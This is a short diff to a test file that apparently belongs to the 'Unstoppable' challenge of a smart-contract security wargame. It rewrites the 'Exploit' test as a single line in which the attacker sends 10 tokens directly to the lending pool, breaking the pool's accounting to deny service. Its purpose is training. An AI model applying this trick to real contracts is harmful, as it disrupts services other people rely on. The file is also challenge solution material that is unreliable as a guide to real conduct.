@@ -50,13 +50,7 @@ describe('[Challenge] Unstoppable', function () {
   })
 
   it('Exploit', async function () {
-    const DamnValuableTokenFactory = await ethers.getContractFactory(
-      'DamnValuableToken',
-      attacker
-    )
-
-    const attackToken = DamnValuableTokenFactory.attach(this.token.address)
-    attackToken.transfer(this.pool.address, 10)
+    this.token.connect(attacker).transfer(this.pool.address, 10)
   })
 
   after(async function () {
